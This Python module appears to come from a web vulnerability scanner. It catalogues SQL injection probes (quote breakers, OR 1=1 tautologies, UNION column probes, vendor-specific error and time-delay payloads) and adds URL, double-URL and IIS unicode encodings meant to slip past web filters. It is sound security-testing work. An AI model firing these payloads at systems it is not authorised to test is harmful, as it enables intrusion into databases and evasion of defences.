"""
Module: talos.sqli.payloads

Purpose:
    SQL injection payload catalogue.

    Payloads are appended to the captured field value (not replacements)
    so typed fields (dates, numbers) still break out of SQL context.

    --db unknown (default):
        Multi-vendor error / UNION / boolean / time probes, plus URL,
        double-URL, and IIS %uXXXX encodings of the syntax breakers.
    --db mssql:
        Generic breakers plus Microsoft SQL Server / T-SQL only.

    Keep encoded variants as distinct technique ids (``{base}__{encoding}``)
    so each (flow, entry point, payload) is one scheduler job.

Dependencies: urllib.parse, talos.sqli.models
Data flow: CLI / engine → generate_sqli_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional
from urllib.parse import quote

from talos.sqli.models import (
    DBMS_GENERIC,
    DBMS_MSSQL,
    DBMS_MYSQL,
    DBMS_ORACLE,
    DBMS_POSTGRES,
    DBMS_SQLITE,
    DB_MSSQL,
    DB_UNKNOWN,
    ENCODEABLE_TECHNIQUES,
    ENCODING_DOUBLE_URL,
    ENCODING_RAW,
    ENCODING_UNICODE,
    ENCODING_URL,
    FAMILIES,
    FAMILY_BOOLEAN,
    FAMILY_ERROR,
    FAMILY_TIME,
    FAMILY_UNION,
    MSSQL_DBMS,
    TECHNIQUE_NAMES,
    SqliPayload,
    normalize_db_type,
)

TIME_DELAY_S = 5.0

_ENCODING_LABELS = {
    ENCODING_URL: "URL-encoded",
    ENCODING_DOUBLE_URL: "double URL-encoded",
    ENCODING_UNICODE: "IIS unicode-encoded",
}


def encode_sqli_text(text: str, encoding: str) -> str:
    """
    Purpose:
        Encode one payload string for WAF / IIS coverage.
    Input:
        text     — raw SQL snippet.
        encoding — url | double_url | unicode.
    Output:
        Encoded string. Raw / unknown encoding returns ``text``.
    Side effects: None.
    """
    if encoding == ENCODING_URL:
        return quote(text, safe="")
    if encoding == ENCODING_DOUBLE_URL:
        return quote(quote(text, safe=""), safe="")
    if encoding == ENCODING_UNICODE:
        parts: list[str] = []
        for char in text:
            if char.isalnum():
                parts.append(char)
            else:
                parts.append(f"%u{ord(char):04X}")
        return "".join(parts)
    return text


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    delay_s: float = 0.0,
    dbms: str = DBMS_GENERIC,
) -> SqliPayload:
    """Purpose: Build a raw (unencoded) catalogue row."""
    return SqliPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        delay_s=delay_s,
        dbms=dbms,
        encoding=ENCODING_RAW,
        base_technique=technique,
    )


def _base_payloads() -> list[SqliPayload]:
    """Purpose: Every raw technique. Filtered later by --db / family."""
    return [
        _payload(
            technique="quote_single",
            family=FAMILY_ERROR,
            payload="'",
            description="Single quote.",
        ),
        _payload(
            technique="quote_double",
            family=FAMILY_ERROR,
            payload='"',
            description="Double quote.",
        ),
        _payload(
            technique="quote_paren",
            family=FAMILY_ERROR,
            payload="')",
            description="Close quote and parenthesis.",
        ),
        _payload(
            technique="comment_dash",
            family=FAMILY_ERROR,
            payload="'--",
            description="Quote plus line comment.",
        ),
        _payload(
            technique="comment_dash_space",
            family=FAMILY_ERROR,
            payload="'-- ",
            description="Quote plus -- comment with trailing space.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="stacked_semi",
            family=FAMILY_ERROR,
            payload="';--",
            description="Stacked-query terminator.",
        ),
        _payload(
            technique="tautology",
            family=FAMILY_ERROR,
            payload="' OR '1'='1",
            description="OR 1=1 tautology.",
        ),
        _payload(
            technique="mssql_tautology",
            family=FAMILY_ERROR,
            payload="' OR 1=1--",
            description="SQL Server OR 1=1 plus line comment.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_convert",
            family=FAMILY_ERROR,
            payload="' AND CONVERT(int,@@version)--",
            description="SQL Server CONVERT error-based.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_convert_db",
            family=FAMILY_ERROR,
            payload="' AND CONVERT(int,DB_NAME())--",
            description="SQL Server CONVERT(DB_NAME()) error-based.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_cast",
            family=FAMILY_ERROR,
            payload="' AND 1=CAST(@@version AS int)--",
            description="SQL Server CAST(@@version) error-based.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_divzero",
            family=FAMILY_ERROR,
            payload="' AND 1/0--",
            description="SQL Server divide-by-zero.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_char_or",
            family=FAMILY_ERROR,
            payload="'+OR+CHAR(49)=CHAR(49)--",
            description="SQL Server CHAR() tautology.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mysql_extractvalue",
            family=FAMILY_ERROR,
            payload="' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            description="MySQL EXTRACTVALUE error-based.",
            dbms=DBMS_MYSQL,
        ),
        _payload(
            technique="pg_cast",
            family=FAMILY_ERROR,
            payload="' AND 1=CAST(version() AS int)--",
            description="PostgreSQL CAST(version()) error-based.",
            dbms=DBMS_POSTGRES,
        ),
        _payload(
            technique="oracle_to_number",
            family=FAMILY_ERROR,
            payload="' AND 1=TO_NUMBER('a')--",
            description="Oracle TO_NUMBER error-based.",
            dbms=DBMS_ORACLE,
        ),
        _payload(
            technique="sqlite_error",
            family=FAMILY_ERROR,
            payload="' AND sqlite_version()=1--",
            description="SQLite version comparison.",
            dbms=DBMS_SQLITE,
        ),
        _payload(
            technique="union_1",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL--",
            description="UNION 1 column.",
        ),
        _payload(
            technique="union_2",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL--",
            description="UNION 2 columns.",
        ),
        _payload(
            technique="union_3",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL--",
            description="UNION 3 columns.",
        ),
        _payload(
            technique="union_4",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL,NULL--",
            description="UNION 4 columns.",
        ),
        _payload(
            technique="union_5",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            description="UNION 5 columns.",
        ),
        _payload(
            technique="bool_true",
            family=FAMILY_BOOLEAN,
            payload="' AND '1'='1",
            description="Boolean true.",
        ),
        _payload(
            technique="bool_false",
            family=FAMILY_BOOLEAN,
            payload="' AND '1'='2",
            description="Boolean false.",
        ),
        _payload(
            technique="mssql_bool_true",
            family=FAMILY_BOOLEAN,
            payload="' AND 1=1--",
            description="SQL Server boolean true.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_bool_false",
            family=FAMILY_BOOLEAN,
            payload="' AND 1=2--",
            description="SQL Server boolean false.",
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_waitfor",
            family=FAMILY_TIME,
            payload="'; WAITFOR DELAY '0:0:5'--",
            description="SQL Server 5s delay.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_waitfor_inline",
            family=FAMILY_TIME,
            payload="' WAITFOR DELAY '0:0:5'--",
            description="SQL Server in-statement 5s delay.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mssql_waitfor_if",
            family=FAMILY_TIME,
            payload="'; IF 1=1 WAITFOR DELAY '0:0:5'--",
            description="SQL Server IF 1=1 WAITFOR 5s.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_MSSQL,
        ),
        _payload(
            technique="mysql_sleep",
            family=FAMILY_TIME,
            payload="' OR SLEEP(5)--",
            description="MySQL 5s sleep.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_MYSQL,
        ),
        _payload(
            technique="pg_sleep",
            family=FAMILY_TIME,
            payload="'; SELECT pg_sleep(5)--",
            description="PostgreSQL 5s sleep.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_POSTGRES,
        ),
        _payload(
            technique="oracle_pipe",
            family=FAMILY_TIME,
            payload="'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--",
            description="Oracle 5s pipe delay.",
            delay_s=TIME_DELAY_S,
            dbms=DBMS_ORACLE,
        ),
    ]


def _with_unknown_encodings(payloads: list[SqliPayload]) -> list[SqliPayload]:
    """
    Purpose:
        Append URL / double-URL / IIS unicode copies of syntax breakers.
    Input:
        payloads — raw catalogue rows already filtered for unknown.
    Output:
        Raw rows first, then encoded variants in catalogue order.
    Side effects: None.
    """
    extras: list[SqliPayload] = []
    for item in payloads:
        if item.technique not in ENCODEABLE_TECHNIQUES:
            continue
        for encoding in (ENCODING_URL, ENCODING_DOUBLE_URL, ENCODING_UNICODE):
            encoded = encode_sqli_text(item.payload, encoding)
            if encoded == item.payload:
                continue
            extras.append(
                SqliPayload(
                    technique=f"{item.technique}__{encoding}",
                    family=item.family,
                    payload=encoded,
                    description=(
                        f"{item.description} ({_ENCODING_LABELS[encoding]})."
                    ),
                    delay_s=item.delay_s,
                    dbms=item.dbms,
                    encoding=encoding,
                    base_technique=item.technique,
                )
            )
    return payloads + extras


def generate_sqli_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
    db_type: Optional[str] = None,
) -> list[SqliPayload]:
    """
    Purpose:
        Build the SQLi probe set for a selected database (optional filters).
    Input:
        techniques — optional allow-list of base or exact technique ids.
        families   — optional allow-list of families (error/union/boolean/time).
        db_type    — unknown (default) or mssql (aliases accepted).
    Output:
        Ordered SqliPayload list.
    Side effects: None. Raises ValueError on unknown family / technique / db.
    """
    selected_db = normalize_db_type(db_type)
    payloads = _base_payloads()

    if selected_db == DB_MSSQL:
        payloads = [item for item in payloads if item.dbms in MSSQL_DBMS]
    elif selected_db == DB_UNKNOWN:
        payloads = _with_unknown_encodings(payloads)

    if families:
        allow_fam = {name.strip().lower() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown SQLi family: " + ", ".join(sorted(unknown_fam))
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = (
            set(TECHNIQUE_NAMES)
            | {item.technique for item in payloads}
            | {item.base_technique for item in payloads}
        )
        unknown = allow - known
        if unknown:
            raise ValueError(
                "unknown SQLi technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [
            item
            for item in payloads
            if item.technique in allow or item.base_technique in allow
        ]
        missing_for_db = [
            name
            for name in allow
            if name not in {item.technique for item in payloads}
            and name not in {item.base_technique for item in payloads}
        ]
        if missing_for_db:
            raise ValueError(
                "SQLi technique(s) not available for --db "
                f"{selected_db}: " + ", ".join(sorted(missing_for_db))
            )
    return payloads


def payload_count_for_db(db_type: Optional[str] = None) -> int:
    """Purpose: Jobs per entry point for a Select DB value. Output: int."""
    return len(generate_sqli_payloads(db_type=db_type))
